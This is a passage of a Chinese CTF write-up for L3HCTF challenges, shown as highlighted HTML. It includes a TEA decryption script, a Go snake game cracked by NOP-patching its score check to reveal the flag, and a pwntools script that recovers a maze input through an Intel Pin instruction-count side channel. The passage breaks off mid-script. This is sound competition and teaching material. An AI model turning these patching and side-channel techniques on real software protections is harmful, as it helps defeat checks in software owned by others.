</span></span><span class=line><span class=cl>    <span class=n>v0</span><span class=p>,</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>c_uint32</span><span class=p>(</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]),</span> <span class=n>c_uint32</span><span class=p>(</span><span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>total</span> <span class=o>=</span> <span class=n>c_uint32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>^</span> <span class=p>(</span><span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>+</span> <span class=n>total</span><span class=o>.</span><span class=n>value</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>total</span><span class=o>.</span><span class=n>value</span> <span class=o>+=</span> <span class=n>delta</span>
</span></span><span class=line><span class=cl>        <span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>^</span> <span class=p>(</span><span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>+</span> <span class=n>total</span><span class=o>.</span><span class=n>value</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>^</span> <span class=p>((</span><span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v0</span><span class=o>.</span><span class=n>value</span><span class=p>,</span> <span class=n>v1</span><span class=o>.</span><span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tea_decrypt</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>delta</span><span class=p>,</span> <span class=nb>id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span><span class=p>,</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>c_uint32</span><span class=p>(</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]),</span> <span class=n>c_uint32</span><span class=p>(</span><span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>total</span> <span class=o>=</span> <span class=n>c_uint32</span><span class=p>(</span><span class=n>delta</span> <span class=o>*</span> <span class=n>r</span> <span class=o>*</span> <span class=p>(</span><span class=nb>id</span><span class=o>//</span><span class=mi>2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>^</span> <span class=p>(</span><span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>+</span> <span class=n>total</span><span class=o>.</span><span class=n>value</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>^</span> <span class=p>((</span><span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>total</span><span class=o>.</span><span class=n>value</span> <span class=o>-=</span> <span class=n>delta</span>
</span></span><span class=line><span class=cl>        <span class=n>v0</span><span class=o>.</span><span class=n>value</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>^</span> <span class=p>(</span><span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>+</span> <span class=n>total</span><span class=o>.</span><span class=n>value</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v1</span><span class=o>.</span><span class=n>value</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v0</span><span class=o>.</span><span class=n>value</span><span class=p>,</span> <span class=n>v1</span><span class=o>.</span><span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=p>[</span><span class=mi>2272944806</span><span class=p>,</span> <span class=mi>1784017395</span><span class=p>,</span> <span class=mi>2920892487</span><span class=p>,</span> <span class=mi>2984657895</span><span class=p>,</span> <span class=mi>2840586369</span><span class=p>,</span> <span class=mi>2613617290</span><span class=p>,</span> <span class=mi>3301943967</span><span class=p>,</span> <span class=mi>4053798049</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>k</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xa56babcd</span><span class=p>,</span> <span class=mh>0xffffffff</span><span class=p>,</span> <span class=mh>0xabcdef01</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>delta</span> <span class=o>=</span> <span class=mh>0x11223344</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>v</span><span class=p>),</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>tea_decrypt</span><span class=p>(</span><span class=mi>64</span><span class=p>,</span> <span class=n>v</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=n>k</span><span class=p>,</span> <span class=n>delta</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>hex</span><span class=p>,</span> <span class=n>v</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>int</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=n>v</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;little&#39;</span><span class=p>,</span> <span class=n>length</span><span class=o>=</span><span class=mi>4</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>v</span><span class=p>))])</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到9c50d10ba864bedfb37d7efa4e110bf2</p><h2 id=snake>snake</h2><p>无符号的go实现的贪吃蛇游戏，直接读逻辑十分困难，然后有反调试，无法正常进行调试</p><p>搜索得到原游戏项目：https://github.com/stable-online/golang_snake?tab=readme-ov-file</p><p>Git clone一份源码然后编译出snake.exe，然后尝试bindiff恢复符号表，效果并不是很好，但是可以作为一个参考的依据。</p><p>寻找定位到得分判断逻辑</p><p><img src=https://su-team.cn/img/2025-L3HCTF/5812720d-b529-4f96-aafe-7e0d8cbe1886.png alt=img></p><p>发现是得分要到100，但是尝试修改得分要求后程序会卡住，往下理逻辑找到了一个xxtea解密的实现</p><p><img src=https://su-team.cn/img/2025-L3HCTF/b7c5cc65-9a4c-4cb4-bd57-62043378d1d0.png alt=img></p><p>分析之间的层次关系发现分数的改变对于xxtea的密钥会产生影响，那么思路想到去寻找得分的逻辑</p><p>利用编译好的原游戏文件辅助定位找到了move逻辑，其中有rc4生成随机的金币位置</p><p><img src=https://su-team.cn/img/2025-L3HCTF/98825187-3d59-41fd-868c-d4f0302bfbfb.png alt=img></p><p>寻找到加分的逻辑</p><p><img src=https://su-team.cn/img/2025-L3HCTF/37f4d4a8-4137-41c3-9f7e-9e267ccf77f8.png alt=img></p><p>现在有条件限制吃到金币之后可以得分，那么我们把这个限制条件nop取消，就可以实现随时间增加自动加分</p><p><img src=https://su-team.cn/img/2025-L3HCTF/51398f3e-a91b-4a54-9d51-cfab38c5262b.png alt=img></p><p>nop掉这里的cmp逻辑即可，然后重新运行程序得到flag（会随机触发不稳定的反调试，多跑几次即可）</p><p><img src=https://su-team.cn/img/2025-L3HCTF/d816f7ca-643c-4f63-b6cb-8ed52f2484d4.png alt=img></p><p>L3HCTF{ad4d5916-9697-4219-af06-014959c2f4c9}</p><h2 id=awayout2>AWayOut2</h2><p>ida反编译根本看不懂只在后面爆破的时候拐回来才看到有个hjkl的判断，很明显迷宫四个方向键</p><p>由于太难分析控制流因此我用pintool进行爆破，观察到输入结果和对应指令数如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>a</span> <span class=mi>419744191</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>k</span> <span class=mi>419730508</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=mi>419730512</span>
</span></span><span class=line><span class=cl><span class=n>j</span> <span class=mi>419730514</span>
</span></span><span class=line><span class=cl><span class=n>l</span> <span class=mi>419744180</span> <span class=err>#</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>la</span> <span class=mi>640207084</span>
</span></span><span class=line><span class=cl><span class=n>lk</span> <span class=mi>640193401</span>
</span></span><span class=line><span class=cl><span class=n>ll</span> <span class=mi>640207073</span> <span class=err>#</span> <span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>lj</span> <span class=mi>640193407</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>lla</span> <span class=mi>860727831</span>
</span></span><span class=line><span class=cl><span class=n>llk</span> <span class=mi>860714148</span>
</span></span><span class=line><span class=cl><span class=n>lll</span> <span class=mi>860714144</span>
</span></span><span class=line><span class=cl><span class=n>llj</span> <span class=mi>860727830</span> <span class=err>#</span> <span class=n>x</span>
</span></span></code></pre></td></tr></table></div></div><p>可以发现输入正确的指令数会和输入不是hjkl指令数相差较小，而其他的指令数绝对值差都大于1000，因此可以逐位进行爆破，使用DFS遍历所有可能</p><p>由于输入后返回结果时间较长，不使用多线程爆破时间太长了，因此我写了份基本单线程脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>collections</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 配置 ---</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span>
</span></span><span class=line><span class=cl><span class=n>PIN_COMMAND</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;./pin&#34;</span><span class=p>,</span> <span class=s2>&#34;-t&#34;</span><span class=p>,</span> <span class=s2>&#34;inscount0.so&#34;</span><span class=p>,</span> <span class=s2>&#34;--&#34;</span><span class=p>,</span> <span class=s2>&#34;./AWayOut2&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># 字符集顺序现在变得更重要。将常见字符放在前面可能会提高效率。</span>
</span></span><span class=line><span class=cl><span class=n>CHARSET</span> <span class=o>=</span> <span class=s2>&#34;{hjkl&#34;</span>
</span></span><span class=line><span class=cl><span class=n>FLAG_LENGTH</span> <span class=o>=</span> <span class=mi>118</span>
</span></span><span class=line><span class=cl><span class=n>ANOMALY_THRESHOLD</span> <span class=o>=</span> <span class=mi>9000</span>  <span class=c1># 显著差异的阈值，可以微调</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 辅助函数 (与之前相同) ---</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_instruction_count</span><span class=p>(</span><span class=n>test_flag</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    运行 PIN 工具并获取给定 flag 的指令数。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>PIN_COMMAND</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;try:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>test_flag</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>lines</span> <span class=ow>and</span> <span class=n>lines</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>isdigit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 新的主逻辑 (激进 DFS) ---</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_aggressive_dfs</span><span class=p>(</span><span class=n>known_prefix</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    使用激进的深度优先搜索策略。
</span></span></span><span class=line><span class=cl><span class=s2>    一旦发现一个字符比当前层级已知的最小指令数显著更低，就立即深入。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 基本情况：如果长度达到目标，说明成功了</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>known_prefix</span><span class=p>)</span> <span class=o>==</span> <span class=n>FLAG_LENGTH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] 成功！找到完整 Flag: </span><span class=si>{</span><span class=n>known_prefix</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>current_pos</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>known_prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] 正在爆破第 </span><span class=si>{</span><span class=n>current_pos</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2> 位字符 (前缀: &#39;</span><span class=si>{</span><span class=n>known_prefix</span><span class=si>}</span><span class=s2>&#39;)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 用于存储当前层级已知的最小指令数</span>
</span></span><span class=line><span class=cl>    <span class=n>min_count_for_this_level</span> <span class=o>=</span> <span class=mi>1000000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>total_chars</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>CHARSET</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>CHARSET</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>test_flag</span> <span class=o>=</span> <span class=n>known_prefix</span> <span class=o>+</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>        <span class=n>progress_text</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;    -&gt; 进度: </span><span class=si>{</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>total_chars</span><span class=si>}</span><span class=s2> | 测试: &#39;</span><span class=si>{</span><span class=n>test_flag</span><span class=si>}</span><span class=s2>&#39;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>progress_text</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>count</span> <span class=o>=</span> <span class=n>get_instruction_count</span><span class=p>(</span><span class=n>test_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>count</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>count</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>  <span class=c1># 跳过执行失败的尝试</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp</span> <span class=o>=</span> <span class=n>count</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=c1># 核心逻辑：检查当前字符的指令数是否比“已知最小”还要显著降低</span>
</span></span><span class=line><span class=cl>        <span class=c1># ANOMALY_THRESHOLD 是你说的 &#34;10000左右&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>abs</span><span class=p>(</span><span class=n>tmp</span> <span class=o>-</span> <span class=n>count</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>ANOMALY_THRESHOLD</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># continue</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>    [*] 发现显著更优字符 &#39;</span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2>&#39;...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [*] 立即深入 DFS 搜索 &#39;</span><span class=si>{</span><span class=n>test_flag</span><span class=si>}</span><span class=s2>&#39;...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 立即递归，不再测试当前层级的其他字符</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>solve_aggressive_dfs</span><span class=p>(</span><span class=n>test_flag</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>True</span>  <span class=c1># 如果这条路成功了，直接返回 True</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># 如果深入后发现是死胡同，打印回溯信息并继续在当前层级搜索</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[!] 路径 &#39;</span><span class=si>{</span><span class=n>test_flag</span><span class=si>}</span><span class=s2>&#39; 是死胡同, 回溯到第 </span><span class=si>{</span><span class=n>current_pos</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2> 位, 继续搜索...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=c1># 即使是死胡同，这个 count 也是一个新的有效最小值，需要更新</span>
</span></span><span class=line><span class=cl>                <span class=n>min_count_for_this_level</span> <span class=o>=</span> <span class=n>count</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 如果不是显著降低，就只更新当前层级的最小指令数</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>count</span> <span class=o>&lt;</span> <span class=n>min_count_for_this_level</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>min_count_for_this_level</span> <span class=o>=</span> <span class=n>count</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 如果遍历完所有字符都没有找到一条成功的路径，则说明当前前缀是错误的</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[-] 在位置 </span><span class=si>{</span><span class=n>current_pos</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2> 处所有尝试均失败。回溯...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 程序入口 ---</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;开始使用“激进”DFS 策略进行全长度 Flag 爆破&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 假设 &#39;h&#39; 仍然是正确的第一个字符</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>solve_aggressive_dfs</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 如果不确定第一个字符，使用下面这行：</span>
</span></span><span class=line><span class=cl>        <span class=c1># if not solve_aggressive_dfs(&#34;&#34;):</span>
